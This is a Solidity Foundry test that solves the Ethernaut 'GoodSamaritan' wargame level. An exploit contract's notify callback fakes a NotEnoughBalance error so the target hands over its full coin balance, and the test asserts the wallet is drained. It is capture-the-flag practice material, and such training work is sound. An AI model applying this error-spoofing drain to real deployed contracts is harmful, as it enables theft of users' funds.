// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../ethernaut/GoodSamaritan.sol";

error NotEnoughBalance();

contract ExploitGoodSamaritan {

    function requestDonation(address goodSamaritan) external {
        GoodSamaritan(goodSamaritan).requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10)
            revert NotEnoughBalance();
    }
}


contract TestGoodSamaritan is Test {
    ExploitGoodSamaritan exploitGoodSamaritan;
    GoodSamaritan goodSamaritan;

    function setUp() external {
        goodSamaritan = new GoodSamaritan();
        exploitGoodSamaritan = new ExploitGoodSamaritan();
    }

    function testExploit() external {
        Coin coin = goodSamaritan.coin();
        Wallet wallet = goodSamaritan.wallet();
        assertEq(coin.balances(address(wallet)), 10**6);
        exploitGoodSamaritan.requestDonation(address(goodSamaritan));
        assertEq(coin.balances(address(exploitGoodSamaritan)), 10 **6);
        assertEq(coin.balances(address(wallet)), 0);
    }

}
